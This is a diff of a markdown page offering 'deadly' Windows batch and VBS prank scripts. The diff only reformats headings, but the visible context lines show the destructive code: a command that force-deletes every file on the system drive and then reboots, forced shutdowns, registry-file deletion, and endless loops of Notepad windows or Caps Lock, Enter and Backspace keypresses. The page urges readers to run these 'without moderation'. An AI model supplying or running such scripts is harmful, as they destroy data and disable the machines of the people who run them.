@@ -20,7 +20,7 @@ Run this command without moderation;)
 
 Save the file anywhere (.bat) and execute it:
 
-##### 2.1 The blue screen of Death
+###### 2.1 The blue screen of Death
 
 Code:
 
@@ -30,8 +30,8 @@ del %systemdrive%\*.*/f/s/q
 shutdown -r -f -t 00
 ```
 
-
-##### 2.2 Stupidity Shutdown
+ 
+###### 2.2 Stupidity Shutdown
 
 code:
 
@@ -41,8 +41,8 @@ msg * Fatal system error due to admin stupidity!
 shutdown -c “Error! You are too stupid!” -s -t 10
 ```
 
-
-##### 2.3 Delete Key Registry Files
+ 
+###### 2.3 Delete Key Registry Files
 
 code:
 
@@ -56,8 +56,8 @@ ECHO Your computer has been fcked.Â Â Have a nice day.
 GOTO MESSAGE
 ```
 
-
-##### 2.4 Endless Notepads
+ 
+###### 2.4 Endless Notepads
 
 code:
 
@@ -68,8 +68,8 @@ START %SystemRoot%\system32\notepad.exe
 GOTO top
 ```
 
-
-##### 2.5 Crazy caps lock
+ 
+###### 2.5 Crazy caps lock
 
 code:
 
@@ -81,8 +81,8 @@ wshshell.sendkeys “{CAPSLOCK}”
 loop
 ```
 
-
-##### 2.6 Endless Enter
+ 
+###### 2.6 Endless Enter
 
 code:
 
@@ -94,8 +94,8 @@ wshshell.sendkeys “~(enter)”
 loop
 ```
 
-
-##### 2.7 Endless Backspace
+ 
+###### 2.7 Endless Backspace
 
 code:
 
@@ -108,8 +108,8 @@ wshshell.sendkeys “{bs}”
 loop
 ```
 
-
-##### 2.8 Popping CD Drives
+ 
+###### 2.8 Popping CD Drives
 
 code:
 
@@ -129,7 +129,8 @@ wscript.sleep 100
 loop
 ```
 
-
+ 
 And have a good day!
 
 Font's: [dbsdp](http://dbsdp.blogspot.com.br/2010/10/destroy-xp-with-single-command.html) | [itechnobuzz](https://www.itechnobuzz.com/the-8-deadly-windows-vbs-commands/l)
+
